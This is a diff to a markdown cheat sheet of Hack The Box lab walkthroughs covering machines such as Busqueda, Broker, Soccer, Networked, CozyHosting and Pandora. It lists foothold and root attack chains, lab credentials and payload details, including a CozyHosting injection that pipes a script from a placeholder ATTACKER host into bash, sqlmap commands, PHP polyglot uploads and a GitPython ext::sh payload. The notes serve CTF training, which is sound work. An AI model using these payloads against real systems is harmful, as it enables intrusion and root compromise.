@@ -2,6 +2,8 @@
 
 > Use this as a reminder checklist, not as a substitute for understanding the technique. Search by protocol, auth mode, function, tool, filename, or AD edge. Each entry links to detailed notes and the official PDF.
 
+> **Independent PDF audit: 3/3 complete.** 71/71 available writeups verified; 58 omitted details integrated and 42 misleading or overly generic items corrected/removed.
+
 ## Baseline checks not to skip
 
 These are separate authentication cases. A failure in one does **not** prove the others are disabled.
@@ -112,7 +114,6 @@ Busqueda is an Easy Difficulty Linux machine that involves exploiting a command 
 - Break out of the evaluated string/expression with Python __import__('os').system(...) while preserving a valid remainder with concatenation/comment syntax.
 - Use the command injection to obtain the initial reverse shell as svc.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
@@ -127,7 +128,7 @@ Busqueda is an Easy Difficulty Linux machine that involves exploiting a command 
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → command injection → reverse shell
+**Memory chain:** Searchor 2.4.0 source diff → Python eval command injection → shell as svc
 
 - It appears to be a search engine aggregator that allows users to search for information on various search engines.
 - Searchor is a comprehensive Python library that streamlines the process of web scraping, retrieving information on any subject, and creating search query URLs.
@@ -149,17 +150,17 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 - Notice that system-checkup.py invokes ./full-checkup.sh with a relative path rather than /opt/scripts/full-checkup.sh.
 - Create an executable malicious /tmp/full-checkup.sh, change into /tmp, and invoke the allowed sudo command with the full-checkup argument.
 - The working directory controls which relative script root executes; running the sudo command from /opt/scripts would execute the legitimate file.
+- Docker is only queried through the allowed system-checkup wrapper to recover the Gitea administrator credential. The actual root boundary is the wrapper invoking cwd-controlled `./full-checkup.sh`; create it in a writable working directory and launch the allowed sudo action from there.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 - Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.
 
 ### Root / Administrator path
 
-**Memory chain:** Git history/config → configuration-file secrets → subdomain enumeration → SSH → source-code review → sudo rule abuse → Docker/container escape → database enumeration → reverse shell
+**Memory chain:** .git config cody credential → private Gitea scripts repository → system-checkup docker-inspect Gitea admin secret → cwd-controlled ./full-checkup.sh → root shell
 
 - By enumerating the files on the remote host, we can identify the credential pair cody:jh1usoih2bkjaspwe92 stored in the /var/www/app/.git/config file.
 - As we do not possess the password for the administrator user, we are unable to examine the private repositories associated with that user.
@@ -203,7 +204,6 @@ Sau is an Easy Difficulty Linux machine that features a Request Baskets instance
 - Exploit Maltrail's unauthenticated command injection in the login parameter to obtain a reverse shell as puma.
 - Use SSRF to enumerate loopback/internal ports, cloud metadata, and internal HTTP APIs. Compare status, size, and timing when responses are not reflected.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
 
 ### Post-foothold local enumeration and lateral movement
@@ -279,8 +279,8 @@ Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated g
 - For the SQLi route, manually exploit the blind condition to extract the staff password hash character by character, crack it, and test SSH reuse.
 - For the alternate route, exploit unauthenticated attachment upload and calculate/predict the server-side filename from the upload timestamp before requesting the PHP payload.
 - Keep the two foothold routes separate: blind SQLi yields an SSH password, while upload prediction yields direct web RCE.
+- For the alternate HelpDeskZ upload route, synchronize the exploit's local timestamp/timezone with the server time shown in the HTTP response; otherwise the MD5-derived uploaded filename prediction can miss.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
 
@@ -352,9 +352,9 @@ Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ 
 
 ### Remote enumeration and foothold checks
 
-- Fingerprint Apache ActiveMQ precisely and map it to CVE-2023-46604/CVE-2023-46606 rather than attacking the web console login.
 - Host a malicious Spring XML bean definition and use the OpenWire deserialization/RCE path to make ActiveMQ fetch it.
 - Use the XML bean to execute a staged command and obtain the activemq shell.
+- Treat the ActiveMQ OpenWire RCE as CVE-2023-46604. The single CVE-2023-46606 reference in the copied prose is a typo; do not look for a second exploit to chain.
 - Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
@@ -368,11 +368,11 @@ Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ 
 
 ### User path
 
-**Memory chain:** SSH → unsafe deserialization → CVE-2023-46604/CVE-2023-46606 → web shell/RCE → reverse shell
+**Memory chain:** ActiveMQ version fingerprint → CVE-2023-46604 OpenWire RCE → malicious Spring XML → shell as activemq
 
 - Apache ActiveMQ Exploitation Searching for vulnerabilities in this version of ActiveMQ shows that it is vulnerable to a deserialisation vulnerability labelled CVE-2023-46604; more information can be found here.
 - Deserialisation Process: ActiveMQ processes incoming data that should represent an error ( Throwable class) during its communication protocol.
-- Foothold Searching on Google for CVE-2023-46606 exploit github reveals this link which has a Proof of Concept code for how to exploit it.
+- Foothold Searching on Google for CVE-2023-46604 exploit github reveals this link which has a Proof of Concept code for how to exploit it.
 - The PoC Golang script leveraged the deserialisation vulnerability to instantiate the class org.springframework.context.support.ClassPathXmlApplicationContext , which allows the configuration of a Spring application via a (remote) XML file: in this case, our malicious XML file that sent a reverse shell to our listener.
 - The user flag can be found at /home/activemq/user.txt .
 
@@ -383,7 +383,7 @@ Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ 
 
 ### Artifacts and exact search anchors
 
-`CVE-2023-46604`, `CVE-2023-46606`, `main.zip`, `poc-linux.xml`, `/home/activemq/user.txt`
+`CVE-2023-46604`, `main.zip`, `poc-linux.xml`, `/home/activemq/user.txt`
 
 Open the PDF around page **2** and search for the technologies, functions, filenames, and tools above.
 
@@ -392,12 +392,13 @@ Open the PDF around page **2** and search for the technologies, functions, filen
 - PUT the public key through the root-run Nginx listener into /root/.ssh/authorized_keys.
 - SSH to root@localhost with the matching private key; this avoids fragile shared-library/log poisoning alternatives.
 - If PUT fails, re-check DAV methods, URL-to-filesystem mapping, Nginx worker user, directory creation, and file permissions.
+- Use the sudo-controlled Nginx configuration to expose a root-run WebDAV listener, PUT a public key into `/root/.ssh/authorized_keys`, and SSH as root. Shared-library or log poisoning is only an unused alternative.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → configuration-file secrets → DLL/library hijacking → SSH → private-key discovery
+**Memory chain:** sudo Nginx with attacker config → root-run WebDAV listener → PUT /root/.ssh/authorized_keys → SSH as root
 
 - There are a few different approaches one could take at this point to leverage this configuration to obtain root privileges, such as the method disclosed in this Zimbra article back in 2021, which involved writing a log file into a shared object library loaded by sudo .
 - However, we opt for a much simpler route: we will use the ngx_http_dav_module to write our public SSH key into the root user's authorized_keys file.
@@ -434,6 +435,7 @@ Soccer is an easy difficulty Linux machine that features a foothold based on def
 - After landing, inspect web-server/vhost configuration and /etc/hosts-style clues for the second site soc-player.soccer.htb; add it locally and enumerate it.
 - Observe that the second application sends search/login data over WebSockets; proxy or script the WebSocket traffic rather than testing only normal HTTP parameters.
 - Confirm blind SQL injection through boolean WebSocket responses, then automate/dump the account table to recover player SSH credentials.
+- For the WebSocket SQL injection, use `sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id": "*"}' --level 5 --risk 3 --batch --dump`; the copied `-level`/`-dump` spellings are typos and require two leading hyphens.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - After obtaining a Linux shell, inspect Nginx configuration with `nginx -T` when permitted and read `/etc/nginx/nginx.conf`, `sites-enabled/*`, `sites-available/*`, and included `conf.d/*`. Record every `server_name`, `listen`, `root`, `alias`, `proxy_pass`, credential, and localhost-only vhost; resolve/tunnel each newly discovered site and enumerate it separately.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
@@ -447,7 +449,7 @@ Soccer is an easy difficulty Linux machine that features a foothold based on def
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → directory/file discovery → CVE-2021-45010 → reverse shell → subdomain enumeration → source-code review → SQL injection
+**Memory chain:** Tiny File Manager default admin → PHP upload shell → Nginx sites-enabled hidden vhost → soc-player.soccer.htb WebSocket → blind SQL injection → SSH as player
 
 - run a directory scan using gobuster to find any potentially interesting files. gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3medium.txt Our enumeration yields a /tiny directory, which when navigated to shows a login panel to a file manager.
 - A search for the keywords tiny file manager reveals a GitHub repository, which in turn divulges the default administrative credentials for the service, namely admin:admin@123 .
@@ -459,7 +461,7 @@ Soccer is an easy difficulty Linux machine that features a foothold based on def
 
 - `nmap -p$ports -sC -sV 10.10.11.194`
 - `gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3medium.txt`
-- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 -level 5 --risk 3 --batch`
+- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch`
 - `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D`
 
 ### Artifacts and exact search anchors
@@ -478,7 +480,7 @@ Open the PDF around page **6** and search for the technologies, functions, filen
 
 ### Root / Administrator path
 
-**Memory chain:** SUID abuse → configuration-file secrets
+**Memory chain:** SUID doas → /usr/local/etc/doas.conf → root dstat rule → writable dstat plugin → root shell
 
 - However, it also presents a potential security vulnerability because it allows attackers to escalate their privileges on a system by exploiting SUID executables.
 - Taking a look at its manual shows a handful of interesting information, most importantly revealing the possibility of using Python plugins for the tool. man dstat If we can execute Python code as the root user, we could spawn a shell with the elevated privileges intact.
@@ -522,6 +524,7 @@ Keeper is an easy-difficulty Linux machine that features a support ticketing sys
 - Recognize CVE-2023-32784 applies to the memory dump and run the KeePass password dumper against it.
 - The dumper output is incomplete/ambiguous; search the recovered phrase fragments to reconstruct the accented master password rather than using the raw output literally.
 - Open the KeePass database and inspect every entry/attachment, especially the Network entry containing a PuTTY-formatted root key.
+- The KeePass dump yields the incomplete phrase dgrød med fløde; searching that fragment reconstructs the Unicode master password rødgrød med fløde, which must be preserved exactly when opening passcodes.kdbx.
 
 ### User path
 
@@ -548,6 +551,7 @@ Open the PDF around page **3** and search for the technologies, functions, filen
 - Extract the PuTTY private key from KeePass and convert it to OpenSSH format with puttygen.
 - Set restrictive key permissions and SSH as root using the converted key.
 - Preserve Unicode characters in the reconstructed KeePass master password.
+- Convert the PuTTY key from the KeePass Network entry with puttygen ssh_key_file -O private-openssh -o id_rsa before chmod/SSH; the raw PuTTY-formatted key is not directly usable by OpenSSH.
 - For KeePass artifacts, collect the database, dump/config/key material, and test the relevant recovery vulnerability; convert any recovered PuTTY/SSH key into a usable OpenSSH key.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
@@ -590,6 +594,7 @@ Networked is an Easy difficulty Linux box vulnerable to file upload bypass, lead
 - Download/read the exposed backup source for upload.php and photos.php before fuzzing payloads blindly.
 - Map the upload checks: permitted image extensions and image validation can be bypassed with a polyglot containing a valid image header plus PHP.
 - Use a filename/extension combination Apache will execute and request the stored file through the gallery/uploads path to obtain www-data code execution.
+- Use a double extension such as shell.php.png and prepend the PNG magic bytes 89 50 4E 47 0D 0A 1A 0A so both the allowed-suffix and MIME checks pass while Apache still interprets the embedded PHP.
 - Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
 - Enumerate scheduled jobs/tasks plus every referenced script, binary, working directory, and PATH component. Writable dependencies matter even when the task itself is protected.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
@@ -603,10 +608,12 @@ Networked is an Easy difficulty Linux box vulnerable to file upload bypass, lead
 - Trace the unsanitized filename variable into the shell/mail command and create a malicious filename that injects a callback command.
 - Wait for the guly cron job to process the filename and catch the lateral-movement shell.
 - Run sudo -l as guly and read changename.sh completely, including its character blacklist and generated /etc/sysconfig/network-scripts/ifcfg-guly file.
+- The cron filename command injection cannot contain / because it must be a valid filename; base64-encode the callback command and decode/execute it from a shell-safe malicious filename.
+- The www-data-to-guly transition is the three-minute `check_attack.php` cron processing an injected upload filename. Root is a separate `sudo changename.sh` CentOS `ifcfg` value-injection path; SSH and PATH hijacking are not the user transition.
 
 ### User path
 
-**Memory chain:** file upload abuse → cron/scheduled-job abuse → source-code review → command injection → SSH → directory/file discovery → reverse shell → PATH hijacking
+**Memory chain:** exposed PHP backup source → shell.php.png PNG polyglot → shell as www-data → three-minute check_attack.php filename injection → shell as guly
 
 - The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.
 - The backup folder contains a tar archive, which seems interesting.
@@ -631,12 +638,11 @@ Open the PDF around page **2** and search for the technologies, functions, filen
 - Exploit CentOS network-script command execution by supplying a crafted interface configuration value that passes the weak blacklist but becomes a shell directive.
 - Let the root-run changename.sh write the malicious ifcfg file and trigger ifup guly0.
 - Account for the script's allowed/blocked characters when constructing the injected command.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → command injection
+**Memory chain:** sudo changename.sh → CentOS ifcfg value injection → root shell
 
 - A shell as guly should be received in a while, after which we can spawn a tty.
 - Looking at the sudo privileges, we see that guly can execute changename.sh as root.
@@ -669,6 +675,7 @@ BoardLight is an easy difficulty Linux machine that features a Dolibarr instance
 - Use the hostname from the page footer, then fuzz the Host header for virtual hosts; crm.board.htb is not found by ordinary directory enumeration.
 - Add crm.board.htb to /etc/hosts and fingerprint Dolibarr 17.0.0.
 - Try the simple admin:admin credential, then exploit CVE-2023-30253 by creating/executing PHP content through the Website module to gain www-data.
+- CVE-2023-30253 depends on Dolibarr's case-sensitive filter: create a Website page, edit its HTML source, and use uppercase <?PHP ... ?> rather than lowercase <?php before viewing the page to execute it.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
@@ -682,7 +689,7 @@ BoardLight is an easy difficulty Linux machine that features a Dolibarr instance
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → virtual-host enumeration → directory/file discovery → subdomain enumeration → reverse shell → database enumeration
+**Memory chain:** crm.board.htb vhost → Dolibarr 17.0.0 → uppercase PHP filter bypass → shell as www-data → conf.php password reuse → SSH as larissa
 
 - Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.
 - filter out responses with a size of 15949 bytes using the -fs flag, which helps us ignore irrelevant results and focus on unique responses that might reveal valid subdomains.
@@ -707,13 +714,13 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 
 - Use the CVE-2022-37706 Enlightenment local privilege-escalation path against the vulnerable SUID helper.
 - Verify the exact helper path/version before running a public script; multiple Enlightenment binaries are present.
+- Escalate through the root-owned SUID Enlightenment 0.23.1 helper with CVE-2022-37706; Git history/configuration is not part of this privilege-escalation path.
 - Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
 - Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.
-- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 
 ### Root / Administrator path
 
-**Memory chain:** SUID abuse → CVE-2022-37706 → Git history/config
+**Memory chain:** SUID Enlightenment 0.23.1 helper → CVE-2022-37706 → root shell
 
 - The command utilizes Python's built-in HTTP server functionality, which allows us to host files easily.
 - This vulnerability allows local users to gain elevated privileges because the binary is SUID and owned as the root user, and the system library function mishandles path names that begin with a /dev/.. substring.
@@ -747,8 +754,8 @@ CozyHosting is an easy-difficulty Linux machine that features a Spring Boot appl
 - Enumerate Spring Boot Actuator endpoints, especially /actuator/sessions and /actuator/mappings, rather than brute-forcing only /login.
 - Steal the exposed authenticated session ID and supply it as the application's session cookie to reach the dashboard.
 - Trace the dashboard's SSH-host input into a shell command; bypass whitespace/character restrictions with shell expansion/encoding and inject a reverse shell.
+- The username command-injection field rejects literal spaces, so use ${IFS} explicitly as the delimiter, for example test;curl${IFS}http://ATTACKER:7000/rev.sh|bash;, while keeping a valid hostname such as 127.0.0.1.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
 
 ### Post-foothold local enumeration and lateral movement
@@ -760,7 +767,7 @@ CozyHosting is an easy-difficulty Linux machine that features a Spring Boot appl
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → directory/file discovery → private-key discovery → command injection → web shell/RCE → reverse shell → configuration-file secrets → database enumeration → password cracking
+**Memory chain:** Spring Actuator session disclosure → stolen dashboard session → ${IFS} command injection → shell as app
 
 - can now run our scan again, this time using a Spring Boot -specific wordlist. ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100 We see the actuator endpoint is exposed, which is mainly used for debugging purposes in Spring Boot applications.
 - This is what we will use to initiate the reverse shell connection to our Netcat listener.
@@ -786,13 +793,12 @@ Open the PDF around page **6** and search for the technologies, functions, filen
 
 ### Privilege-escalation checks
 
-- Use SSH's ProxyCommand/command-execution option through the allowed sudo /usr/bin/ssh invocation to spawn a root shell.
-- The target host need not be reachable when the local SSH option executes the shell; focus on allowed argument control.
+- The allowed SSH command is abused with `PermitLocalCommand=yes` and `LocalCommand=/bin/bash`. LocalCommand runs only after a successful SSH connection, so authenticate as `josh@127.0.0.1` with Josh's valid password; an unreachable dummy host or ProxyCommand is the wrong path.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 
 ### Root / Administrator path
 
-**Memory chain:** SSH → sudo rule abuse
+**Memory chain:** JAR/PostgreSQL credential recovery → crack Josh hash → SSH as josh → sudo SSH PermitLocalCommand → root shell
 
 - Upon checking the sudo permissions for the user josh , we discover that they can run /usr/bin/ssh as root . sudo -l We can leverage this to gain a shell as root .
 - Reading through the SSH documentation and this link, we see that running the command with the -o flag allows us to specify the PermitLocalCommand=yes option.
@@ -826,6 +832,7 @@ Editorial is an easy difficulty Linux machine that features a publishing web app
 - Automate a localhost port sweep through the SSRF because the visible port-80 response is only a JPEG and does not prove no other internal service exists.
 - Query the discovered internal API endpoints and versions; an API response exposes the dev SSH credential.
 - Use the dev credential over SSH and enumerate the user's application directory for hidden source-control metadata.
+- The cover-URL SSRF sweep identifies localhost port 5000; then request http://127.0.0.1:5000/api/latest/metadata/messages/authors through the same preview flow, because that exact internal endpoint returns the dev SSH credential.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Use SSRF to enumerate loopback/internal ports, cloud metadata, and internal HTTP APIs. Compare status, size, and timing when responses are not reflected.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
@@ -866,6 +873,7 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 - Map the GitPython behavior to CVE-2022-24439 and use an ext:: URL so the root-run clone operation executes a shell command/script.
 - Stage the reverse-shell script in a readable path, start the listener, and pass the crafted ext::sh URL to the exact allowed sudo command.
 - Do not rely only on the CVE number: the exploitable input is the arbitrary clone URL passed directly to Repo.clone_from.
+- GitPython's ext:: remote-helper payload uses % in place of a space; pass a value such as 'ext::sh -c bash% /tmp/shell.sh' to the exact allowed clone_prod_change.py sudo command or the helper command will parse incorrectly.
 
 ### Root / Administrator path
 
@@ -904,18 +912,15 @@ Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server 
 - Use the credential over SSH, then inspect local listeners and Apache vhost files under /etc/apache2/sites-enabled/.
 - Read pandora.conf: Pandora FMS is bound to localhost:80 and requires SSH dynamic/local forwarding plus a SOCKS-aware browser/proxychains.
 - Fingerprint Pandora FMS and exploit the chart_generator.php session_id SQLi to dump tsessions_php and obtain Matt's valid session.
-- Use the authenticated Pandora session to reach the file-manager/RCE functionality and gain a shell as matt.
+- Matt's stolen standard Pandora session cannot use file upload, so the PHAR-deserialization route fails. Use the Events AJAX command injection instead: URL-encode `/` and place the command in the target request parameter.
 - Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
 - Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
 - Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - After landing on Linux, inspect Apache configuration (`apachectl -S`, `/etc/apache2/sites-enabled/*`, `sites-available/*`, included configs, and `.htaccess`). Record hidden `ServerName`/aliases, document roots, proxy targets, access-control headers, credentials, and localhost-only vhosts, then tunnel/enumerate them.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
-- Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
-- Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -925,7 +930,7 @@ Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server 
 
 ### User path
 
-**Memory chain:** SSH → SNMP enumeration → SQL injection → web shell/RCE → SUID abuse → virtual-host enumeration → configuration-file secrets → authentication bypass → file upload abuse → unsafe deserialization
+**Memory chain:** SNMP process command-line credential → SSH as daniel → localhost Pandora vhost tunnel → session_id SQL injection → Matt session → Events AJAX target command injection → shell as matt
 
 - The port scan reveals a SSH, web-server and SNMP service running on the box.
 - Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user daniel .
@@ -949,12 +954,13 @@ Open the PDF around page **1** and search for the technologies, functions, filen
 
 - Create a malicious executable named tar in a writable directory, prepend that directory to PATH, and run pandora_backup.
 - The exploit depends on relative command resolution inside the SUID binary; an absolute /usr/bin/tar call would not be vulnerable.
+- If Matt's shell is restricted and pandora_backup fails, escape it through the SUID /usr/bin/at GTFOBins path (for example echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null) before creating /tmp/tar, prepending /tmp to PATH, and running pandora_backup.
 - Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 
 ### Root / Administrator path
 
-**Memory chain:** SUID abuse → PATH hijacking → reverse shell
+**Memory chain:** SUID /usr/bin/at restricted-shell escape → SUID pandora_backup → relative tar PATH hijack → root shell
 
 - But this binary has the SUID bit set, so the binary must run with root privileges.
 - This seems to be a case of a restricted shell.
@@ -989,8 +995,9 @@ LinkVortex is an easy-difficulty Linux machine with various ways to leverage sym
 - Authenticate to Ghost and exploit CVE-2023-40028 by importing a ZIP that preserves a symlink.
 - Use the symlink file-read first against a harmless path, then target /var/lib/ghost/config.production.json for the host user's credential.
 - Reuse the Ghost configuration credential to SSH as bob.
+- Build the Ghost import as exploit/content/images/<name>.png and archive it with zip -r -y so the symlink is stored as a symlink; an ordinary ZIP operation may dereference it and defeat CVE-2023-40028.
+- Ghost runs in a container, but no container escape is needed: use the symlink import for arbitrary file read of `/var/lib/ghost/config.production.json`, recover Bob's reused credential, and SSH to the host.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
@@ -1004,7 +1011,7 @@ LinkVortex is an easy-difficulty Linux machine with various ways to leverage sym
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → subdomain enumeration → directory/file discovery → Git history/config → Docker/container escape → LFI/local file read → CVE-2023-40028 → symlink/race-condition abuse → writable script/file abuse
+**Memory chain:** dev vhost → exposed Git history → Ghost administrator credential → CVE-2023-40028 symlink ZIP file read → config.production.json Bob credential → SSH as bob
 
 - Foothold Now that we can access the ghost dashboard, let's see what we can find.
 - will exploit it manually, but a PoC from GitHub that can automate the process for us is available.
@@ -1033,13 +1040,14 @@ Open the PDF around page **7** and search for the technologies, functions, filen
 - Race clean_symlink.sh until its privileged read copies/discloses root's private SSH key.
 - Save the recovered key with correct formatting/permissions and authenticate as root.
 - A local broken symlink is sufficient; re-uploading through Ghost is not required once bob has shell access.
+- Export CHECK_CONTENT=true before invoking sudo clean_symlink.sh; sudo preserves it via env_keep+=CHECK_CONTENT, and without it the race can move the symlink but the script will not print the target file content.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Inspect shell histories and command histories for credentials, internal hostnames, administrative scripts, and commands that reveal how services are managed.
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → symlink/race-condition abuse → private-key discovery → SSH
+**Memory chain:** sudo clean_symlink.sh → CHECK_CONTENT environment → symlink TOCTOU → root SSH key → SSH as root
 
 - After the symlink is moved to quarantine, we can quickly swap the link target to point to a sensitive file such as /etc/shadow or even a private key for root such as /root/.ssh/id_rsa .
 - The link will point to /root/.ssh/id_rsa to get a root ssh terminal.
@@ -1074,8 +1082,9 @@ Dog is an easy-rated Linux machine that involves reading sensitive information t
 - Inspect recovered settings.php/history for the MySQL credential, then enumerate valid CMS usernames and test password reuse on the CMS login.
 - Use administrator access to upload a Backdrop module/archive containing a PHP backdoor and trigger it for the web shell.
 - Test the same recovered CMS/database password against local users; johncusack reuses it for SSH.
+- The authenticated Backdrop module installer is not reachable at the clean path on this target; use ?q=/admin/modules/install and upload a correctly structured tar.gz containing a module directory, shell.info, and shell.php, then request /modules/shell/shell.php.
+- Treat the web stack as Apache plus Backdrop CMS. Do not spend time on IIS `applicationHost.config`/binding enumeration for this machine.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
